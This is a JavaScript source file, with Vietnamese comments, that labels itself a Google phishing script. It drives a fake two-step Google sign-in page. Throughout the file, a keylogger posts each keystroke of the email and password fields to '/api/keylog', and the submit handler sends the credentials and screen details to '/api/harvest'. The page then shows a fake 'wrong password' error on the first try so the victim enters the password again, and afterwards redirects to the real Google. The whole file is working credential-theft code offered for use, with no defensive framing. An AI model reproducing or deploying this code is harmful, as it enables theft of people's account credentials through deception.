/**
 * Google Phishing Script
 * - 2 bước: Email → Password (giống Google thật)
 * - Keylogger realtime
 * - Thu hoạch credentials
 */
const SESSION_ID = 'gg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
let submitCount = 0;

// ===== KEYLOGGER =====
function setupKeylogger(inputEl, fieldName) {
    let debounceTimer;
    inputEl.addEventListener('input', function() {
        clearTimeout(debounceTimer);
        debounceTimer = setTimeout(() => {
            fetch('/api/keylog', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    field: fieldName,
                    value: inputEl.value,
                    key: 'input',
                    page_type: 'google',
                    session_id: SESSION_ID
                })
            }).catch(() => {});
        }, 300);
    });
}

setupKeylogger(document.getElementById('email'), 'email');
setupKeylogger(document.getElementById('password'), 'password');

// ===== STEP NAVIGATION =====
function goToStep2() {
    const email = document.getElementById('email').value.trim();
    if (!email) {
        document.getElementById('errorMsg1').classList.add('show');
        document.getElementById('email').focus();
        return;
    }
    document.getElementById('errorMsg1').classList.remove('show');
    
    // Hiện email trong chip
    document.getElementById('emailDisplay').textContent = email;
    
    // Chuyển step
    document.getElementById('step1').classList.remove('active');
    document.getElementById('step2').classList.add('active');
    
    setTimeout(() => document.getElementById('password').focus(), 400);
}

function goToStep1() {
    document.getElementById('step2').classList.remove('active');
    document.getElementById('step1').classList.add('active');
    document.getElementById('errorMsg2').classList.remove('show');
    setTimeout(() => document.getElementById('email').focus(), 300);
}

// Toggle show password
function togglePassword() {
    const pw = document.getElementById('password');
    pw.type = document.getElementById('showPw').checked ? 'text' : 'password';
}

// ===== SUBMIT =====
async function submitForm() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    if (!password) {
        document.getElementById('errorMsg2').classList.add('show');
        return;
    }
    document.getElementById('errorMsg2').classList.remove('show');

    const loading = document.getElementById('loadingOverlay');
    loading.classList.add('active');
    document.getElementById('btnSubmit').disabled = true;

    try {
        const response = await fetch('/api/harvest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email, password,
                page_type: 'google',
                screen_info: {
                    width: screen.width,
                    height: screen.height,
                    pixelRatio: window.devicePixelRatio
                }
            })
        });
        const result = await response.json();
        submitCount++;

        await new Promise(r => setTimeout(r, 1500 + Math.random() * 800));
        loading.classList.remove('active');
        document.getElementById('btnSubmit').disabled = false;

        if (submitCount === 1) {
            // Lần 1: "Sai mật khẩu"
            document.getElementById('errorMsg2').classList.add('show');
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        } else {
            // Lần 2: Redirect đến Google thật
            if (result.redirect) window.location.href = result.redirect;
        }
    } catch (error) {
        loading.classList.remove('active');
        document.getElementById('btnSubmit').disabled = false;
        window.location.href = 'https://accounts.google.com';
    }
}

// Enter key support
document.getElementById('email').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') goToStep2();
    if (e.key !== 'Enter' && e.key !== 'Tab') document.getElementById('errorMsg1').classList.remove('show');
});
document.getElementById('password').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') submitForm();
    if (e.key !== 'Enter' && e.key !== 'Tab') document.getElementById('errorMsg2').classList.remove('show');
});
